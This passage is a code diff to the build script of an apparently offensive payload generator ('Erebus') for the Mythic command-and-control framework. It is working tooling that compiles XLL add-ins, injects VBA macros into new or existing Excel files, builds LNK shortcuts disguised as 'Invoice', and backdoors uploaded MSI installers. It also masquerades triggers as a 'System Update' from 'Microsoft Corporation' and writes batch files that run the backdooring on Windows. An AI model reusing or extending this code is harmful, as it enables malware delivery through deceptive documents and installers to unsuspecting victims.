+                            shutil.copy(str(xll_config_path), str(payload_dir / "xll_config.h"))
+                            output += f"[*] XLL headers copied to payload directory\n"
 
-                                # Compile to XLL
-                                xll_output_path = payload_dir / f"{doc_name}.xll"
-                                success = compiler.compile_xll(
-                                    source_file=str(xll_source_path),
-                                    output_file=str(xll_output_path),
-                                    extra_libs=xll_guardrail_extra_libs_list
-                                )
-
-                                if success:
-                                    if not xll_output_path.exists():
-                                        alt_xll_path = xll_build_dir / f"{doc_name}.xll"
-                                        if alt_xll_path.exists():
-                                            shutil.copy2(alt_xll_path, xll_output_path)
-
-                                if xll_output_path.exists():
-                                    output += f"[+] Successfully compiled XLL: {xll_output_path.name}\n"
-                                    output += f"[*] XLL size: {xll_output_path.stat().st_size} bytes\n"
-
-                                    # Create clean XLSX from template and delete XLL
-                                    try:
-                                        clean_xlsx_path = self.cleanup_xll_and_create_clean_xlsx(
-                                            str(xll_output_path),
-                                            doc_name,
-                                            payload_dir
-                                        )
-                                        output += f"[+] Created clean XLSX: {os.path.basename(clean_xlsx_path)}\n"
-                                        output += f"[+] Deleted XLL file (execution complete)\n"
-                                    except Exception as e:
-                                        output += f"[!] Warning: Failed to cleanup XLL: {str(e)}\n"
-
-                                    await SendMythicRPCPayloadUpdatebuildStep(
-                                        MythicRPCPayloadUpdateBuildStepMessage(
-                                            PayloadUUID=self.uuid,
-                                            StepName="[T1559.002] - Compiling XLL DLL",
-                                            StepStdout=f"Compiled XLL: {xll_output_path.name}",
-                                            StepSuccess=True
-                                        ))
-                                else:
-                                    output += "[-] XLL compilation failed\n"
-                                    raise RuntimeError("XLL compilation returned failure status")
-
-                                # Save source for reference
-                                xll_source_ref = payload_dir / f"{doc_name}.cpp"
-                                shutil.copy(str(xll_source_path), str(xll_source_ref))
-                                output += f"[*] Source code saved to: {xll_source_ref.name}\n"
-
-                            except ImportError:
-                                output += "[*] Windows compiler not available, using Linux cross-compilation (MinGW-w64)...\n"
-
-                                xll_output_path = payload_dir / f"{doc_name}.xll"
-
-                                # Use the working erebus_xll directory for builds
-                                xll_dir = xll_build_dir
-                                if not xll_dir.exists():
-                                    raise RuntimeError(f"XLL build directory not found: {xll_dir}")
-
-                                sdk_zip = xll_dir / "Excel2013XLLSDK.zip"
-                                sdk_dir = xll_dir / "Excel2013XLLSDK"
-
-                                # Check and verify MinGW-w64 availability
-                                check_mingw = subprocess.run(
-                                    ["which", "x86_64-w64-mingw32-g++"],
-                                    capture_output=True,
-                                    text=True
-                                )
-                                if check_mingw.returncode != 0:
-                                    raise RuntimeError(
-                                        "MinGW-w64 cross-compiler not found. Install with: "
-                                        "apt-get install mingw-w64 (Debian/Ubuntu) or brew install mingw-w64 (macOS)"
-                                    )
-                                output += "[+] MinGW-w64 cross-compiler found\n"
-
-                                make_cmd = [
-                                    "make",
-                                    "-f", str(xll_dir / "Makefile"),
-                                    f"XLL_SOURCE={str(xll_source_path)}",
-                                    f"XLL_OUTPUT={str(xll_output_path)}",
-                                    f"SRCDIR={str(xll_build_dir)}/",
-                                    "ARCH=x64",
-                                    "OPTIMIZATION=O2"
-                                ]
-
-                                if xll_guardrail_extra_libs:
-                                    make_cmd.append(f"EXTRA_LIBS={xll_guardrail_extra_libs}")
-
-                                output += f"[*] Build directory: {xll_dir}\n"
-                                output += f"[*] Source file: {xll_source_path.name}\n"
-                                output += f"[*] Output file: {xll_output_path.name}\n"
-                                output += f"[*] Build dir: {xll_build_dir}\n"
-                                output += "[*] Compiling XLL with MinGW-w64...\n"
-                                output += f"[DEBUG] Make command: {' '.join(make_cmd)}\n"
-
-                                # Run make compilation
-                                result = subprocess.run(
-                                    make_cmd,
-                                    capture_output=True,
-                                    text=True,
-                                    timeout=300,
-                                    cwd=str(xll_dir)
-                                )
-
-                                # Capture both stdout and stderr for debugging
-                                if result.stdout:
-                                    output += f"[DEBUG] Make stdout:\n{result.stdout}\n"
-
-                                if result.stderr:
-                                    output += f"[DEBUG] Make stderr:\n{result.stderr}\n"
-
-                                if result.returncode == 0:
-                                    output += "[+] Make compilation successful\n"
-                                    if not xll_output_path.exists():
-                                        # Try alternate path in build directory
-                                        alt_xll_path = xll_build_dir / f"{doc_name}.xll"
-                                        if alt_xll_path.exists():
-                                            shutil.copy2(str(alt_xll_path), str(xll_output_path))
-                                            output += f"[+] Copied XLL from build directory\n"
-                                else:
-                                    output += f"[!] Make compilation returned non-zero exit code: {result.returncode}\n"
-                                    if result.stderr:
-                                        output += f"[ERROR] Make stderr:\n{result.stderr}\n"
-
-                                    # Debug: Check what files exist in the temp build directory
-                                    output += f"[DEBUG] Files in temp build directory:\n"
-                                    try:
-                                        if xll_build_dir.exists():
-                                            for f in xll_build_dir.iterdir():
-                                                output += f"  - {f.name}\n"
-                                        else:
-                                            output += f"  [!] Temp build directory does not exist: {xll_build_dir}\n"
-                                    except Exception as e:
-                                        output += f"  [!] Error listing directory: {str(e)}\n"
-
-                                    # Debug: Check SDK availability
-                                    output += f"[DEBUG] SDK status:\n"
-                                    if sdk_dir.exists():
-                                        output += f"  [+] Module SDK dir exists: {sdk_dir}\n"
-                                    else:
-                                        output += f"  [-] Module SDK dir not found: {sdk_dir}\n"
-
-                                # Verify compilation was successful
-                                if xll_output_path.exists():
-                                    xll_size = xll_output_path.stat().st_size
-                                    output += f"[+] Successfully compiled XLL via MinGW-w64: {xll_output_path.name}\n"
-                                    output += f"[*] XLL size: {xll_size} bytes\n"
-
-                                    if xll_size < 5000:
-                                        output += f"[!] Warning: XLL size is very small ({xll_size} bytes). Compilation may have failed.\n"
-
-                                else:
-                                    output += f"[-] XLL file not created at expected location: {xll_output_path}\n"
-                                    # Check if it was created in the temp directory instead
-                                    alt_xll_path = xll_build_dir / f"{doc_name}.xll"
-                                    if alt_xll_path.exists():
-                                        output += f"[!] Found XLL in temp directory instead: {alt_xll_path}\n"
-                                        try:
-                                            shutil.copy2(str(alt_xll_path), str(xll_output_path))
-                                            output += f"[+] Copied XLL to expected location\n"
-                                        except Exception as e:
-                                            output += f"[!] Failed to copy: {str(e)}\n"
-                                    else:
-                                        output += f"[DEBUG] XLL not found in temp directory either\n"
-                                        error_msg = f"XLL file not created after compilation.\n"
-                                        if result.stderr:
-                                            error_msg += f"Build errors:\n{result.stderr}"
-                                        elif result.returncode != 0:
-                                            error_msg += f"Make exited with code {result.returncode}"
-                                        else:
-                                            error_msg += "Make reported success but XLL file not found"
-
-                                        output += f"[-] {error_msg}\n"
-                                        raise RuntimeError(f"XLL compilation failed: {error_msg}")
-
-                                # Send success notification
-                                if xll_output_path.exists():
-                                    xll_size = xll_output_path.stat().st_size
-                                    await SendMythicRPCPayloadUpdatebuildStep(
-                                        MythicRPCPayloadUpdateBuildStepMessage(
-                                            PayloadUUID=self.uuid,
-                                            StepName="[T1559.002] - Compiling XLL DLL",
-                                            StepStdout=f"[SUCCESS] Compiled XLL via MinGW-w64: {xll_output_path.name} ({xll_size} bytes)",
-                                            StepSuccess=True
-                                        ))
-
-                                # Save source for reference
-                                try:
-                                    xll_source_ref = payload_dir / f"{doc_name}.cpp"
-                                    shutil.copy(str(xll_source_path), str(xll_source_ref))
-                                    output += f"[*] Source code saved to: {xll_source_ref.name}\n"
-                                except Exception as e:
-                                    output += f"[!] Could not save source reference: {str(e)}\n"
+                            # ---- Generate build_xll.bat for native recompilation on Windows ----
+                            bat_extra = f' --extra-flags "{xll_guardrail_extra_libs}"' if xll_guardrail_extra_libs else ""
+                            bat_lines = [
+                                "@echo off",
+                                "REM Recompile XLL natively on Windows using the bundled helper.",
+                                "REM Run this on a Windows host after extracting the payload archive.",
+                                f'python erebus_helper.py xll --source "{xll_source_ref.name}" --output "{xll_output_path.name}" --compiler {xll_compiler} --arch x64 --optimize Ox{bat_extra}',
+                                "echo XLL compiled: %errorlevel%",
+                            ]
+                            bat_path = payload_dir / "build_xll.bat"
+                            bat_path.write_text("\r\n".join(bat_lines), encoding="utf-8")
+                            output += f"[+] Generated build_xll.bat for native Windows recompilation\n"
 
                         except Exception as e:
                             output += f"[-] XLL compilation error: {str(e)}\n"
@@ -3112,23 +2913,46 @@ static size_t key_len = sizeof(key);
                             ))
 
                     elif maldoc_type == "Create New":
-                        # Create a new Excel document from template
-                        excel_output = payload_dir / f"{doc_name}.xlsm"
+                        maldoc_fmt = (self.get_parameter("0.9p MalDoc Output Format") or "xlsm").lower()
 
-                        # Get template path from templates directory
-                        templates_dir = Path(agent_build_path) / "templates"
-                        template_xlsx = templates_dir / "template.xlsx"
+                        # Always export the .bas so the operator can re-inject manually
+                        from erebus_wrapper.erebus.modules.plugin_payload_maldocs import PayloadMalDocsPlugin as _MDP
+                        _plugin = _MDP()
+                        bas_output = payload_dir / f"{doc_name}_payload.bas"
+                        _plugin.export_vba_as_bas(vba_code=vba_code, output_path=str(bas_output), module_name=doc_name)
 
-                        excel_path = generate_excel_payload(
-                            payload_path=str(payload_dir),
-                            vba_payload=vba_code,
-                            output_path=excel_output,
-                            template_path=template_xlsx if template_xlsx.exists() else None
-                        )
-
-                        success_msg = f"Created malicious Excel document: {excel_path.name}"
+                        if maldoc_fmt == "xlsm":
+                            # Linux ZIP injection — immediate, best-effort
+                            excel_output = payload_dir / f"{doc_name}.xlsm"
+                            templates_dir = Path(agent_build_path) / "templates"
+                            template_xlsx = templates_dir / "template.xlsx"
+                            excel_path = generate_excel_payload(
+                                payload_path=str(payload_dir),
+                                vba_payload=vba_code,
+                                output_path=excel_output,
+                                template_path=template_xlsx if template_xlsx.exists() else None
+                            )
+                            success_msg = f"Created Excel document (xlsm): {excel_path.name}"
+                        else:
+                            # xlsx/xlam — deferred via helper on Windows host
+                            excel_output = payload_dir / f"{doc_name}.{maldoc_fmt}"
+                            bat_lines = [
+                                "@echo off",
+                                f"REM Inject VBA into {maldoc_fmt.upper()} via erebus_helper (run on Windows).",
+                                f'python erebus_helper.py {maldoc_fmt} --bas-file "{bas_output.name}" --output "{excel_output.name}" --module-name "{doc_name}"',
+                                "echo MalDoc created: %errorlevel%",
+                            ]
+                            bat_path = payload_dir / "build_maldoc.bat"
+                            bat_path.write_text("\r\n".join(bat_lines), encoding="utf-8")
+                            success_msg = (
+                                f"VBA exported to {bas_output.name}. "
+                                f"Run build_maldoc.bat on a Windows host to produce {excel_output.name}."
+                            )
+                            output += f"[+] Generated build_maldoc.bat for Windows-side {maldoc_fmt.upper()} injection\n"
 
                     else:  # Backdoor Existing
+                        maldoc_fmt = (self.get_parameter("0.9p MalDoc Output Format") or "xlsm").lower()
+
                         # Get the uploaded Excel file
                         excel_uuid = self.get_parameter("0.9b Excel Source File")
                         if not excel_uuid:
@@ -3150,24 +2974,50 @@ static size_t key_len = sizeof(key);
                         if file_name_resp.Success and len(file_name_resp.Files) > 0:
                             original_filename = file_name_resp.Files[0].Filename
 
-                        # Save the uploaded file temporarily
-                        temp_excel = Path(tempfile.gettempdir()) / f"source_{excel_uuid}.xlsx"
-                        temp_excel.write_bytes(file_resp.Content)
+                        # Save the uploaded file to the payload dir for the operator to use
+                        source_excel_name = f"{Path(original_filename).stem}_source{Path(original_filename).suffix}"
+                        source_excel_path = payload_dir / source_excel_name
+                        source_excel_path.write_bytes(file_resp.Content)
 
-                        # Backdoor the Excel file
-                        output_name = f"{Path(original_filename).stem}_backdoored.xlsm"
-                        excel_output = payload_dir / output_name
+                        # Always export .bas
+                        from erebus_wrapper.erebus.modules.plugin_payload_maldocs import PayloadMalDocsPlugin as _MDP
+                        _plugin = _MDP()
+                        bas_output = payload_dir / f"{doc_name}_payload.bas"
+                        _plugin.export_vba_as_bas(vba_code=vba_code, output_path=str(bas_output), module_name=doc_name)
 
-                        excel_path = backdoor_existing_excel(
-                            source_excel=str(temp_excel),
-                            vba_payload=vba_code,
-                            output_path=excel_output
-                        )
+                        if maldoc_fmt == "xlsm":
+                            # Linux ZIP injection — temp file, immediate
+                            temp_excel = Path(tempfile.gettempdir()) / f"source_{excel_uuid}.xlsx"
+                            temp_excel.write_bytes(file_resp.Content)
 
-                        # Cleanup temp file
-                        temp_excel.unlink(missing_ok=True)
+                            output_name = f"{Path(original_filename).stem}_backdoored.xlsm"
+                            excel_output = payload_dir / output_name
 
-                        success_msg = f"Backdoored Excel document: {excel_path.name}"
+                            excel_path = backdoor_existing_excel(
+                                source_excel=str(temp_excel),
+                                vba_payload=vba_code,
+                                output_path=excel_output
+                            )
+
+                            temp_excel.unlink(missing_ok=True)
+                            success_msg = f"Backdoored Excel document (xlsm): {excel_path.name}"
+                        else:
+                            # xlsx/xlam — deferred via helper on Windows host
+                            output_name = f"{Path(original_filename).stem}_backdoored.{maldoc_fmt}"
+                            excel_output = payload_dir / output_name
+                            bat_lines = [
+                                "@echo off",
+                                f"REM Backdoor existing Excel file with VBA via erebus_helper (run on Windows).",
+                                f'python erebus_helper.py {maldoc_fmt} --bas-file "{bas_output.name}" --source-excel "{source_excel_name}" --output "{excel_output.name}" --module-name "{doc_name}"',
+                                "echo MalDoc created: %errorlevel%",
+                            ]
+                            bat_path = payload_dir / "build_maldoc.bat"
+                            bat_path.write_text("\r\n".join(bat_lines), encoding="utf-8")
+                            success_msg = (
+                                f"VBA exported to {bas_output.name}. "
+                                f"Run build_maldoc.bat on a Windows host to produce {excel_output.name}."
+                            )
+                            output += f"[+] Generated build_maldoc.bat for Windows-side {maldoc_fmt.upper()} backdooring\n"
 
                     await SendMythicRPCPayloadUpdatebuildStep(
                         MythicRPCPayloadUpdateBuildStepMessage(
@@ -3214,15 +3064,43 @@ static size_t key_len = sizeof(key);
 
                     match trigger_type:
                         case "LNK":
-                            trigger_path = create_payload_trigger(
-                                target_bin=str(self.get_parameter("0.9a Trigger Binary")),
-                                args=str(self.get_parameter("0.9b Trigger Command")),
-                                icon_src=r"C:\\Windows\\System32\\imageres.dll",
+                            trigger_bin  = str(self.get_parameter("0.9a Trigger Binary"))
+                            trigger_args = str(self.get_parameter("0.9b Trigger Command"))
+
+                            # Load the helper's trigger_lnk module via path so
+                            # the dot-in-directory name doesn't break imports.
+                            # This keeps icon-resolution logic in one place
+                            # (erebus_helper.py) rather than duplicated here.
+                            _helper_root = Path(__file__).parent.parent / "agent_code" / "Erebus.Helper"
+                            _lnk_mod_path = _helper_root / "modules" / "trigger_lnk.py"
+                            import importlib.util as _ilu
+                            _lnk_spec = _ilu.spec_from_file_location("_helper_trigger_lnk", str(_lnk_mod_path))
+                            _lnk_mod  = _ilu.module_from_spec(_lnk_spec)
+                            _lnk_spec.loader.exec_module(_lnk_mod)
+
+                            trigger_path = _lnk_mod.create_payload_trigger(
+                                target_bin=trigger_bin,
+                                args=trigger_args,
+                                icon_src=r"%SystemRoot%\system32\shell32.dll",
                                 icon_index=0,
                                 description="Invoice",
                                 payload_dir=payload_dir,
-                                decoy_file=decoy_file
+                                decoy_file=decoy_file,
                             )
+
+                            # Write a Windows batch file so the operator can
+                            # re-build the LNK with native icon resolution on
+                            # a Windows host using the bundled erebus_helper.py.
+                            lnk_name = trigger_path.name if hasattr(trigger_path, "name") else str(trigger_path).split(os.sep)[-1]
+                            bat_lines = [
+                                "@echo off",
+                                "REM Re-create LNK with correct Windows icons using the bundled helper.",
+                                "REM Run this on a Windows host after extracting the payload archive.",
+                                f'python erebus_helper.py lnk --target-binary "{trigger_bin}" --arguments "{trigger_args}" --output "{lnk_name}" --description "Invoice"',
+                                "echo LNK created: %errorlevel%",
+                            ]
+                            bat_path = payload_dir / "build_lnk.bat"
+                            bat_path.write_text("\r\n".join(bat_lines), encoding="utf-8")
 
                         case "BAT":
                             trigger_path = create_bat_payload_trigger(
@@ -3246,7 +3124,7 @@ static size_t key_len = sizeof(key);
                                 app_name="System Update",
                                 app_publisher="Microsoft Corporation"
                             )
-                        
+
                         case "MSC":
                             trigger_path = create_msc_explorer_trigger(
                                 payload_exe="erebus.exe",
@@ -3279,40 +3157,130 @@ static size_t key_len = sizeof(key);
             ######################### End Of Trigger Generation Section #########################
             ######################### MSI Backdooring Section #########################
 
-            # Backdoor MSI if user uploaded one (adds backdoored MSI to payload directory)
-            await self.backdoor_msi_payload(agent_build_path)
+            # Stage MSI and write helper batch file if the operator enabled it
+            if self.get_parameter("5.3 Enable MSI Backdoor"):
+                msi_backdoor_uuid = self.get_parameter("5.4 MSI Backdoor File")
+                if msi_backdoor_uuid:
+                    # Download the MSI content
+                    file_resp = await SendMythicRPCFileGetContent(
+                        MythicRPCFileGetContentMessage(AgentFileId=msi_backdoor_uuid)
+                    )
+                    if not file_resp.Success or not file_resp.Content:
+                        await SendMythicRPCPayloadUpdatebuildStep(
+                            MythicRPCPayloadUpdateBuildStepMessage(
+                            PayloadUUID=self.uuid,
+                            StepName="[T1218.007] - Staging MSI",
+                            StepStdout="Failed to download uploaded MSI file from Mythic",
+                            StepSuccess=False,
+                        ))
+                    else:
+                        file_content = await getFileFromMythic(
+                            agentFileId=msi_backdoor_uuid
+                        )
+
+                        # Resolve original filename via Mythic file search
+                        original_msi_name = f"source_{msi_backdoor_uuid}.msi"
+                        try:
+                            name_resp = await SendMythicRPCFileSearch(
+                                MythicRPCFileSearchMessage(AgentFileID=msi_backdoor_uuid)
+                            )
+                            if name_resp.Success and name_resp.Files:
+                                candidate = name_resp.Files[0].Filename
+                                if candidate and candidate.lower().endswith(".msi"):
+                                    original_msi_name = candidate
+                        except Exception:
+                            pass  # fall back to uuid-based name
+
+                        # Stage the source MSI into payload_dir
+                        msi_payload_dir = Path(agent_build_path) / "payload"
+                        msi_payload_dir.mkdir(parents=True, exist_ok=True)
+                        staged_source_msi = msi_payload_dir / original_msi_name
+                        staged_source_msi.write_bytes(file_content)
+
+                        # Collect build parameters for the helper invocation
+                        msi_attack_type   = self.get_parameter("5.5 MSI Attack Type") or "execute"
+                        msi_entry_point   = self.get_parameter("5.6 MSI Entry Point") or ""
+                        msi_command_args  = self.get_parameter("5.7 MSI Command Arguments") or ""
+                        msi_condition     = self.get_parameter("5.8 MSI Execution Condition") or "NOT REMOVE"
+                        msi_custom_action = self.get_parameter("5.9 MSI Custom Action Name") or ""
+
+                        if not msi_custom_action:
+                            import random as _r, string as _s
+                            msi_custom_action = ''.join(_r.choices(_s.ascii_letters, k=8))
+
+                        # Determine expected payload filename based on attack type
+                        if msi_attack_type in ("load-dll", "dotnet"):
+                            msi_payload_filename = "erebus.dll"
+                        elif msi_attack_type == "script":
+                            msi_payload_filename = "erebus.vbs"
+                        else:
+                            msi_payload_filename = "erebus.exe"
+
+                        backdoored_name = f"{Path(original_msi_name).stem}-backdoored.msi"
+
+                        # Build the erebus_helper.py command line with all parameters baked in
+                        cmd_parts = [
+                            "python erebus_helper.py msi",
+                            f'--msi-file "{original_msi_name}"',
+                            f'--payload "{msi_payload_filename}"',
+                            f'--output "{backdoored_name}"',
+                            f'--attack-type {msi_attack_type}',
+                            f'--condition "{msi_condition}"',
+                            f'--custom-action-name {msi_custom_action}',
+                        ]
+                        if msi_entry_point:
+                            cmd_parts.append(f'--entry-point "{msi_entry_point}"')
+                        if msi_command_args:
+                            cmd_parts.append(f'--arguments "{msi_command_args}"')
+
+                        bat_lines = [
+                            "@echo off",
+                            "REM Erebus MSI Backdoor - run this on the Windows target after extracting the archive.",
+                            "REM Requires: python erebus_helper.py (bundled) + the payload executable.",
+                            "REM Requires Python 3.11 or lower for MSILib to work correctly (Python 3.12+ deprecates MSILib).",
+                            "",
+                            " ^\r\n    ".join(cmd_parts),
+                            "",
+                            "if %errorlevel% neq 0 (",
+                            "    echo [!] Backdooring failed - check parameters and re-run manually.",
+                            ") else (",
+                            f'    echo [+] Backdoored MSI written to: {backdoored_name}',
+                            ")",
+                        ]
+                        bat_path = msi_payload_dir / "backdoor_msi.bat"
+                        bat_path.write_text("\r\n".join(bat_lines), encoding="utf-8")
+
+                        await SendMythicRPCPayloadUpdatebuildStep(
+                            MythicRPCPayloadUpdateBuildStepMessage(
+                            PayloadUUID=self.uuid,
+                            StepName="[T1218.007] - Staging MSI",
+                            StepStdout=(
+                                f"Staged: {original_msi_name}\n"
+                                f"Run backdoor_msi.bat on Windows to produce {backdoored_name}\n"
+                                f"Attack: {msi_attack_type}  |  Action: {msi_custom_action}  |  Condition: {msi_condition}"
+                            ),
+                            StepSuccess=True,
+                        ))
 
             ######################### End Of MSI Backdooring Section #########################
             ######################### Windows Helper Export #########################
 
-            # Export Erebus.Helper for Windows-specific operations
+            # Export Erebus.Helper as a single merged Python script so it
+            # can be run directly (python erebus_helper.py <cmd>) or compiled
+            # to a standalone exe with PyInstaller on the target Windows host.
             try:
-                helper_src = Path(__file__).parent.parent / "erebus_wrapper" / "agent_code" / "Erebus.Helper" / "main.py"
-                helper_dst = Path(agent_build_path) / "Erebus.Helper" / "main.py"
+                helper_src = Path(__file__).parent.parent / "agent_code" / "Erebus.Helper"
+                helper_out = Path(agent_build_path) / "payload" / "erebus_helper.py"
 
                 if helper_src.exists():
-                    helper_dst.parent.mkdir(parents=True, exist_ok=True)
-                    shutil.copy(str(helper_src), str(helper_dst))
-
-                    # Also copy config.ini if it exists
-                    config_src = helper_src.parent / "config.ini"
-                    if config_src.exists():
-                        config_dst = helper_dst.parent / "config.ini"
-                        shutil.copy(str(config_src), str(config_dst))
-
-                    # Copy requirements.txt if it exists
-                    req_src = helper_src.parent / "requirements.txt"
-                    if req_src.exists():
-                        req_dst = helper_dst.parent / "requirements.txt"
-                        shutil.copy(str(req_src), str(req_dst))
-
-                    output += "[+] Exported Erebus.Helper for Windows operations\n"
+                    self._bundle_helper_as_single_file(helper_src, helper_out)
+                    output += "[+] Exported Erebus.Helper as erebus_helper.py\n"
 
                     await SendMythicRPCPayloadUpdatebuildStep(
                         MythicRPCPayloadUpdateBuildStepMessage(
                         PayloadUUID=self.uuid,
                         StepName="[T1036] - Exporting Helper",
-                        StepStdout="Exported Erebus.Helper for Windows operations",
+                        StepStdout="Exported Erebus.Helper as single-file erebus_helper.py",
                         StepSuccess=True,
                     ))
             except Exception as e:
